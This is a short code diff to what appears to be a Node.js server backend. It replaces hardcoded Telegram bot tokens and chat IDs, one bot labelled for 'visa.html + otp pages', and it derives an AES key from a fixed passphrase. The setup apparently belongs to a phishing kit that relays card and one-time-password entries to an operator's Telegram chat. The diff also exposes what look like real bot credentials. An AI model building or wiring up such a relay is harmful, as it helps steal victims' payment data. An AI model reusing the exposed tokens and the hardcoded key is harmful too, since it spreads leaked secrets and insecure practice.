@@ -10,12 +10,12 @@ const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, 'data.json');
 
 // Telegram Configuration - Bot 1 (index.html + form.html)
-const TELEGRAM_BOT_TOKEN_1 = '8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E';
-const TELEGRAM_CHAT_ID_1 = '8108427825';
+const TELEGRAM_BOT_TOKEN_1 = '8205760930:AAE0zTdpfYZ3-C27b1m-j9BruITXx0RTt1A';
+const TELEGRAM_CHAT_ID_1 = '8413882740';
 
 // Telegram Configuration - Bot 2 (visa.html + otp pages) - PUT YOUR NEW BOT CREDENTIALS HERE
-const TELEGRAM_BOT_TOKEN_2 = '8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E';
-const TELEGRAM_CHAT_ID_2 = '8108427825';
+const TELEGRAM_BOT_TOKEN_2 = '8205760930:AAE0zTdpfYZ3-C27b1m-j9BruITXx0RTt1A';
+const TELEGRAM_CHAT_ID_2 = '8413882740';
 
 // Encryption key (32 bytes for AES-256)
 const ENCRYPTION_KEY = crypto.scryptSync('secure-tameen-key-2024', 'salt', 32);
